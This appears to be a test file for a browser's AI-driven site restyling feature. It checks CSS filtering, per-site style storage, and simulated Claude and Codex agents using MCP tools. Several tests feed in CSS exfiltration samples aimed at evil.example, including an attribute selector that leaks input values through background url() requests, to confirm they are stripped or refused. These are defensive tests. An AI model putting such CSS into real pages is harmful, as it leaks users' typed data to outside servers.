import assert from 'node:assert/strict'
import { chmodSync, existsSync, mkdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import path from 'node:path'
import { beforeEach, test } from 'node:test'
import type { WebContents } from 'electron'
import { userData } from '../mocks/electron'
import { CssChecker, Restyler, siteOf, type RestyleDeps } from '../../src/main/restyle'
import type { RestyleSettings } from '../../src/main/settings'

const stylesPath = path.join(userData, 'styles.json')

/**
 * Stands in for Chromium's parse and serialize: CSSStyleSheet drops @import rules and otherwise
 * (for the CSS used here) gives back what it was given.
 */
const serialize = async (css: string) => css.replace(/^@import[^;]*;\s*/gm, '')

function checker(serializer: (css: string) => Promise<string | null> = serialize) {
  const c = new CssChecker()
  ;(c as unknown as { serialize: typeof serializer }).serialize = serializer
  return c
}

const quiet = async <T>(fn: () => Promise<T>): Promise<T> => {
  const [error, log] = [console.error, console.log]
  console.error = console.log = () => {}
  try {
    return await fn()
  } finally {
    console.error = error
    console.log = log
  }
}

test('siteOf is the hostname without www, for websites only', () => {
  assert.equal(siteOf('https://www.example.com/a'), 'example.com')
  assert.equal(siteOf('HTTP://Example.com:8080/'), 'example.com')
  assert.equal(siteOf('http://localhost:3000/'), 'localhost')
  assert.equal(siteOf('http://[::1]/'), '[::1]')
  assert.equal(siteOf('https://bücher.de/'), 'xn--bcher-kva.de')
  assert.equal(siteOf('https://www2.example.com/'), 'www2.example.com')
  for (const url of ['file:///C:/a.html', 'about:blank', 'chrome-extension://x/y.html', 'https://', '', 'javascript:alert(1)']) {
    assert.equal(siteOf(url), null, url)
  }
})

test('CssChecker keeps a stylesheet that fetches nothing', async () => {
  const css = 'body { color: red !important; }\na::after { content: "url(https://evil.example/)"; }'
  assert.deepEqual(await checker().check(css), { css, removed: 0 })
})

test('CssChecker keeps data: URLs', async () => {
  const css = 'a { background: url("data:image/png;base64,AAAA") !important; }'
  assert.deepEqual(await checker().check(css), { css, removed: 0 })
})

test('CssChecker replaces url(), image-set() and src() that fetch', async () => {
  const css = [
    'input[value^="a"] { background: url("https://evil.example/a") !important; }',
    'b { background-image: image-set(url("x.png") 1x, url("y.png") 2x); }',
    'c { background-image: -webkit-image-set("a.png" 1x); }',
    '@font-face { font-family: x; src: url("//evil/f.woff"); }',
    'd { mask: url("data:image/svg+xml,<svg/>"), url("/relative.svg"); }',
  ].join('\n')
  const result = await checker().check(css)
  assert.ok(result)
  assert.doesNotMatch(result.css, /evil|x\.png|a\.png|relative/)
  assert.match(result.css, /data:image\/svg/)
  assert.equal(result.removed, 5)
})

test('CssChecker counts @import rules that Chromium dropped', async () => {
  const result = await checker().check('@import url("https://evil.example/x.css");\na { color: red; }')
  assert.deepEqual(result, { css: 'a { color: red; }', removed: 1 })
})

test('CssChecker drops a stylesheet that still fetches after stripping', async () => {
  // An unquoted url() can't come out of Chromium's serializer, so the strict check catches it.
  assert.equal(await checker().check('a { background: url(https://evil.example/) }'), null)
  // A serializer that put the reference back.
  let calls = 0
  const stubborn = checker(async (css) => (++calls === 1 ? css : 'a { background: url("https://evil.example/") }'))
  assert.equal(await stubborn.check('a { background: url("https://x/") }'), null)
})

test('CssChecker is not fooled by quotes in escapes or strings', async () => {
  // The escaped quote doesn't start a string that would hide the url().
  assert.equal(await checker().check(String.raw`.a\"b { background: url(https://evil/) } .c { content: "x" }`), null)
  // A url() inside a string is only text.
  const css = 'a::before { content: "see url(https://example.com) and @import"; }'
  assert.deepEqual(await checker().check(css), { css, removed: 0 })
  // Nor is an @import in a string counted as one taken out.
  assert.deepEqual(await checker().check(`@import url("x.css");\n${css}`), { css, removed: 1 })
})

test('CssChecker gives up when the stylesheet cannot be parsed', async () => {
  assert.equal(await checker(async () => null).check('a { color: red }'), null)
  // The real one, with no Electron here, fails to parse and says so instead of throwing.
  assert.equal(await quiet(() => new CssChecker().check('a { color: red }')), null)
})

// ---------- Restyler ----------

function settings(over: Partial<RestyleSettings> = {}): RestyleSettings {
  return { enabled: true, agent: 'claude', model: 'sonnet', codexModel: '', claudePath: '', codexPath: '', ...over }
}

function fakePage(url: string, id = 1) {
  const wc = {
    id,
    url,
    destroyed: false,
    inserted: new Map<string, string>(),
    next: 0,
    getURL: () => wc.url,
    isDestroyed: () => wc.destroyed,
    async insertCSS(css: string) {
      const key = `k${++wc.next}`
      wc.inserted.set(key, css)
      return key
    },
    async removeInsertedCSS(key: string) {
      wc.inserted.delete(key)
    },
    async capturePage() {
      return { isEmpty: () => false, getSize: () => ({ width: 800, height: 600 }), toJPEG: () => Buffer.from('jpeg') }
    },
    scripts: [] as string[],
    async executeJavaScriptInIsolatedWorld(_world: number, [{ code }]: { code: string }[]) {
      wc.scripts.push(code)
      if (code.startsWith('((SELS)')) return 'a: 3 matches'
      if (code.startsWith('((CSS)')) return 'Selectors that match nothing on this page:\n- .gone'
      return { title: 'T', viewport: '800×600', dark: false, outline: 'body', vars: '', covers: [], palette: 'page: white' }
    },
  }
  return wc
}

function restyler(pages: ReturnType<typeof fakePage>[] = [], over: Partial<RestyleSettings> = {}) {
  const notes: string[] = []
  let changes = 0
  const deps: RestyleDeps = {
    settings: () => settings(over),
    pages: () => pages as unknown as WebContents[],
    onChange: () => void changes++,
    notify: (text) => void notes.push(text),
  }
  const r = new Restyler(deps)
  ;(r as unknown as { checker: CssChecker }).checker = checker()
  return { r, notes, changes: () => changes }
}

const settle = () => new Promise((resolve) => setTimeout(resolve, 10))

const store = (sites: object) => writeFileSync(stylesPath, JSON.stringify(sites))
const change = (prompt: string, css: string) => ({ prompt, css, note: `did ${prompt}`, at: 1 })

beforeEach(() => rmSync(stylesPath, { force: true }))

test('a page gets its site’s latest stylesheet when it navigates', async () => {
  store({ 'example.com': { enabled: true, changes: [change('red', 'a { color: red; }'), change('blue', 'a { color: blue; }')] } })
  const wc = fakePage('https://www.example.com/x')
  const { r } = restyler([wc])
  r.load()
  r.onNavigate(wc as unknown as WebContents)
  await settle()
  assert.deepEqual([...wc.inserted.values()], ['a { color: blue; }'])
})

test('other sites, disabled sites and non-web pages get nothing', async () => {
  store({ 'example.com': { enabled: false, changes: [change('red', 'a { color: red; }')] } })
  const { r } = restyler()
  r.load()
  for (const url of ['https://example.com/', 'https://other.com/', 'file:///C:/x.html']) {
    const wc = fakePage(url)
    r.onNavigate(wc as unknown as WebContents)
    await settle()
    assert.equal(wc.inserted.size, 0, url)
  }
})

test('a stylesheet edited by hand to fetch from a server is not inserted', async () => {
  store({ 'example.com': { enabled: true, changes: [change('x', 'a { background: url(https://evil/) }')] } })
  const wc = fakePage('https://example.com/')
  const { r } = restyler([wc])
  r.load()
  r.onNavigate(wc as unknown as WebContents)
  await settle()
  assert.equal(wc.inserted.size, 0)
})

test('undo, disable and reset update open pages and styles.json', async () => {
  store({ 'example.com': { enabled: true, changes: [change('red', 'a { color: red; }'), change('blue', 'a { color: blue; }')] } })
  const wc = fakePage('https://example.com/')
  const elsewhere = fakePage('https://other.com/', 2)
  const { r, changes } = restyler([wc, elsewhere])
  r.load()
  r.onNavigate(wc as unknown as WebContents)
  await settle()

  r.undo('example.com')
  await settle()
  assert.deepEqual([...wc.inserted.values()], ['a { color: red; }'])
  assert.equal(JSON.parse(readFileSync(stylesPath, 'utf8'))['example.com'].changes.length, 1)

  r.setEnabled('example.com', false)
  await settle()
  assert.equal(wc.inserted.size, 0)
  assert.deepEqual(r.styledSites(), [{ host: 'example.com', changes: 1, enabled: false }])

  r.setEnabled('example.com', true)
  await settle()
  r.reset('example.com')
  await settle()
  assert.equal(wc.inserted.size, 0)
  assert.equal(elsewhere.inserted.size, 0)
  assert.deepEqual(JSON.parse(readFileSync(stylesPath, 'utf8')), {})
  assert.equal(changes(), 4)
})

test('undoing the last change forgets the site', () => {
  store({ 'a.com': { enabled: true, changes: [change('red', 'a { color: red; }')] } })
  const { r } = restyler()
  r.load()
  r.undo('a.com')
  assert.deepEqual(r.styledSites(), [])
  assert.equal(r.view('https://a.com/')?.changes.length, 0)
  // Unknown sites are ignored.
  r.undo('nope.com')
  r.reset('nope.com')
  r.setEnabled('nope.com', false)
  r.cancel('nope.com')
})

test('view describes the page’s site', () => {
  store({ 'example.com': { enabled: true, changes: [change('red', 'a{}')] } })
  const { r } = restyler()
  r.load()
  assert.deepEqual(r.view('https://www.example.com/page'), {
    host: 'example.com',
    changes: [{ prompt: 'red', note: 'did red' }],
    enabled: true,
    running: null,
  })
  assert.deepEqual(r.view('https://new.com/'), { host: 'new.com', changes: [], enabled: true, running: null })
  assert.equal(r.view('about:blank'), null)
})

test('styledSites is sorted and leaves out sites with no changes', () => {
  store({ 'zeta.com': { enabled: true, changes: [change('a', 'a{}')] }, 'alpha.com': { enabled: false, changes: [change('a', 'a{}'), change('b', 'b{}')] }, 'empty.com': { enabled: true, changes: [] } })
  const { r } = restyler()
  r.load()
  assert.deepEqual(r.styledSites(), [
    { host: 'alpha.com', changes: 2, enabled: false },
    { host: 'zeta.com', changes: 1, enabled: true },
  ])
})

test('a corrupt styles.json starts empty', async () => {
  writeFileSync(stylesPath, '{nope')
  const { r } = restyler()
  await quiet(async () => r.load())
  assert.deepEqual(r.styledSites(), [])
})

test('restyle says when the agent’s command is missing, and leaves the site as it was', async () => {
  const wc = fakePage('https://example.com/')
  const missing = path.join(userData, 'no-such-dir', process.platform === 'win32' ? 'claude.exe' : 'claude')
  const { r, notes } = restyler([wc], { claudePath: missing })
  await quiet(() => r.restyle(wc as unknown as WebContents, '  make it red  '))
  assert.equal(notes.length, 1)
  assert.match(notes[0], /^Couldn't restyle example\.com: jbrow can't find the claude command/)
  assert.deepEqual(r.styledSites(), [])
  assert.equal(r.view('https://example.com/')?.running, null)
})

test('restyle names Codex when it is the agent', async () => {
  const wc = fakePage('https://example.com/')
  const { r, notes } = restyler([wc], { agent: 'codex', codexPath: path.join(userData, 'missing-codex') })
  await quiet(() => r.restyle(wc as unknown as WebContents, 'red'))
  assert.match(notes[0], /can't find the codex command/)
})

test('restyle ignores empty prompts and pages that are not websites', async () => {
  const { r, notes, changes } = restyler()
  await r.restyle(fakePage('https://example.com/') as unknown as WebContents, '   ')
  await r.restyle(fakePage('file:///C:/x.html') as unknown as WebContents, 'red')
  assert.deepEqual(notes, [])
  assert.equal(changes(), 0)
})

type Agent = 'claude' | 'codex'

/**
 * A stand-in for the claude or codex command that works like the real one with tools: it finds
 * jbrow's MCP server the way that agent does (claude: a --mcp-config file; codex: -c settings and
 * the token in its environment), makes each of `calls` on it in turn (keeping what came back),
 * then answers with `answer`, or hangs when it's 'hang'.
 */
function fakeAgent(agent: Agent, calls: { name: string; arguments: object }[], answer: { css: string; note: string } | 'hang') {
  const dir = path.join(userData, `fake-${agent}-${Math.random().toString(36).slice(2)}`)
  const bin = path.join(dir, agent)
  const log = path.join(dir, 'log.json')
  mkdirSync(dir, { recursive: true })
  writeFileSync(
    bin,
    `#!${process.execPath}
const fs = require('fs')
const argv = process.argv
const arg = (name) => argv[argv.indexOf(name) + 1]
let url, headers
if (${JSON.stringify(agent)} === 'claude') {
  ;({ url, headers } = JSON.parse(fs.readFileSync(arg('--mcp-config'), 'utf8')).mcpServers.jbrow)
} else {
  url = JSON.parse(argv.find((a) => a.startsWith('mcp_servers.jbrow.url=')).split('=').slice(1).join('='))
  headers = { Authorization: 'Bearer ' + process.env.JBROW_MCP_TOKEN }
}
let input = ''
process.stdin.on('data', (d) => (input += d))
process.stdin.on('end', async () => {
  const rpc = async (id, method, params) => (await (await fetch(url, { method: 'POST', headers: { ...headers, 'content-type': 'application/json' }, body: JSON.stringify({ jsonrpc: '2.0', id, method, params }) })).json())
  const record = { args: argv.slice(2), input, tools: [], results: [] }
  await rpc(1, 'initialize', { protocolVersion: '2025-06-18' })
  record.tools = (await rpc(2, 'tools/list', {})).result.tools.map((t) => t.name)
  record.unauthorized = (await fetch(url, { method: 'POST', body: '{}' })).status
  let id = 3
  for (const call of ${JSON.stringify(calls)}) record.results.push((await rpc(id++, 'tools/call', call)).result)
  fs.writeFileSync(${JSON.stringify(log)}, JSON.stringify(record))
  const answer = ${JSON.stringify(answer)}
  if (answer === 'hang') return setTimeout(() => {}, 1e9)
  if (${JSON.stringify(agent)} === 'claude') console.log(JSON.stringify({ type: 'result', is_error: false, structured_output: answer }))
  else fs.writeFileSync(arg('--output-last-message'), JSON.stringify(answer))
})
`,
  )
  chmodSync(bin, 0o755)
  const record = () => {
    const r = JSON.parse(readFileSync(log, 'utf8')) as {
      args: string[]
      input: string
      tools: string[]
      unauthorized: number
      results: { content: { type: string; text?: string; data?: string }[]; isError?: boolean }[]
    }
    // What the agent was asked: claude gets a stream-json message, codex plain text.
    const text = agent === 'claude' ? (JSON.parse(r.input) as { message: { content: { type: string; text?: string }[] } }).message.content.find((c) => c.type === 'text')!.text! : r.input
    return { ...r, text }
  }
  const settings: Partial<RestyleSettings> = agent === 'claude' ? { claudePath: bin } : { agent: 'codex', codexPath: bin }
  return { bin, record, log, settings }
}

for (const agent of ['claude', 'codex'] as const) {
  test(`${agent}: works on the page with tools and keeps the stylesheet it answers with`, { skip: process.platform === 'win32' }, async () => {
    const wc = fakePage('https://example.com/')
    const fake = fakeAgent(
      agent,
      [
        { name: 'inspect', arguments: { selectors: ['a'] } },
        { name: 'preview', arguments: { css: 'a { color: red; }' } },
        { name: 'preview', arguments: { css: 'a { background: url(https://evil.example/) }' } },
        { name: 'outline', arguments: { selector: 'main' } },
      ],
      { css: 'a { color: blue; }', note: 'blue links' },
    )
    const { r, notes } = restyler([wc], fake.settings)
    let shown = ''
    const insert = wc.insertCSS
    wc.insertCSS = async (css) => ((shown ||= css), insert(css))
    await quiet(() => r.restyle(wc as unknown as WebContents, 'links in red'))
    await settle()
    const run = fake.record()
    assert.deepEqual(run.tools, ['inspect', 'outline', 'preview'])
    assert.equal(run.unauthorized, 401)
    // The token is never on the command line.
    assert.doesNotMatch(run.args.join(' '), /Bearer|[0-9a-f]{48}/)
    assert.match(run.text, /Request \(from the person\): links in red/)
    assert.match(run.text, /Colors and fonts on screen now:\npage: white/)
    const [inspected, previewed, refused] = run.results
    assert.equal(inspected.content[0].text, 'a: 3 matches')
    // The preview went on the page, and came back as a screenshot with what looked wrong.
    assert.equal(shown, 'a { color: red; }')
    assert.equal(previewed.content[0].type, 'image')
    assert.match(previewed.content[1].text!, /match nothing on this page:\n- \.gone/)
    assert.equal(refused.isError, true)
    assert.match(refused.content[0].text!, /another server/)
    assert.deepEqual(notes, ['blue links'])
    assert.deepEqual([...wc.inserted.values()], ['a { color: blue; }'])
  })

  test(`${agent}: cancelling takes a preview off the page again`, { skip: process.platform === 'win32' }, async () => {
    store({ 'example.com': { enabled: true, changes: [change('green', 'a { color: green; }')] } })
    const wc = fakePage('https://example.com/')
    const fake = fakeAgent(agent, [{ name: 'preview', arguments: { css: 'a { color: red; }' } }], 'hang')
    const { r, notes } = restyler([wc], fake.settings)
    r.load()
    const done = quiet(() => r.restyle(wc as unknown as WebContents, 'links in red'))
    while (!existsSync(fake.log)) await settle()
    assert.match(r.view('https://example.com/')!.running!.doing, /^trying a stylesheet/)
    assert.deepEqual([...wc.inserted.values()], ['a { color: red; }'])
    r.cancel('example.com')
    await done
    await settle()
    assert.deepEqual(notes, [])
    assert.deepEqual([...wc.inserted.values()], ['a { color: green; }'])
  })
}

test('claude: runs with only jbrow’s tools, and its MCP config file is removed afterwards', { skip: process.platform === 'win32' }, async () => {
  const wc = fakePage('https://example.com/')
  const fake = fakeAgent('claude', [], { css: 'a { color: red; }', note: 'red' })
  const { r } = restyler([wc], fake.settings)
  await quiet(() => r.restyle(wc as unknown as WebContents, 'links in red'))
  const { args } = fake.record()
  assert.ok(args.includes('--strict-mcp-config'))
  assert.ok(!args.includes('--safe-mode'))
  assert.equal(args[args.indexOf('--tools') + 1], '')
  assert.equal(existsSync(args[args.indexOf('--mcp-config') + 1]), false)
})

test('codex: jbrow’s tools are approved up front', { skip: process.platform === 'win32' }, async () => {
  const wc = fakePage('https://example.com/')
  const fake = fakeAgent('codex', [], { css: 'a { color: red; }', note: 'red' })
  const { r } = restyler([wc], fake.settings)
  await quiet(() => r.restyle(wc as unknown as WebContents, 'links in red'))
  const { args } = fake.record()
  assert.ok(args.includes('mcp_servers.jbrow.default_tools_approval_mode="approve"'))
  assert.ok(args.includes('mcp_servers.jbrow.bearer_token_env_var="JBROW_MCP_TOKEN"'))
})

test('a preview after the page left the site is refused', { skip: process.platform === 'win32' }, async () => {
  const wc = fakePage('https://example.com/')
  const fake = fakeAgent('claude', [{ name: 'preview', arguments: { css: 'a { color: red; }' } }], { css: 'a { color: red; }', note: 'red' })
  const { r } = restyler([wc], fake.settings)
  // Leaves the site as the preview goes in.
  const insert = wc.insertCSS
  wc.insertCSS = async (css) => ((wc.url = 'https://other.com/'), insert(css))
  await quiet(() => r.restyle(wc as unknown as WebContents, 'links in red'))
  const [result] = fake.record().results
  assert.equal(result.isError, true)
  assert.match(result.content[0].text!, /left the site/)
})

test('turned off, restyling applies no stylesheets and takes no requests', async () => {
  store({ 'example.com': { enabled: true, changes: [change('red', 'a { color: red; }')] } })
  const wc = fakePage('https://example.com/')
  const on = { enabled: true }
  const { r, notes } = restyler([wc])
  ;(r as unknown as { deps: RestyleDeps }).deps.settings = () => settings(on)
  r.load()
  r.onNavigate(wc as unknown as WebContents)
  await settle()
  assert.deepEqual([...wc.inserted.values()], ['a { color: red; }'])
  on.enabled = false
  r.refreshAll()
  await settle()
  assert.equal(wc.inserted.size, 0)
  await r.restyle(wc as unknown as WebContents, 'blue')
  assert.deepEqual(notes, [])
  assert.equal(r.view('https://example.com/')?.running, null)
  // Nothing was forgotten: turned on again, the site's style is back.
  on.enabled = true
  r.refreshAll()
  await settle()
  assert.deepEqual([...wc.inserted.values()], ['a { color: red; }'])
})

test('checkAgents says which agents are installed', async () => {
  const there = path.join(userData, 'agent-there')
  writeFileSync(there, '')
  const { r, changes } = restyler([], { claudePath: there, codexPath: path.join(userData, 'agent-missing') })
  assert.deepEqual(r.agents(), { claude: null, codex: null })
  assert.deepEqual(await r.checkAgents(), { claude: true, codex: false })
  assert.deepEqual(r.agents(), { claude: true, codex: false })
  assert.equal(changes(), 1)
  // Nothing changed, so nothing to tell the UI.
  await r.checkAgents()
  assert.equal(changes(), 1)
})
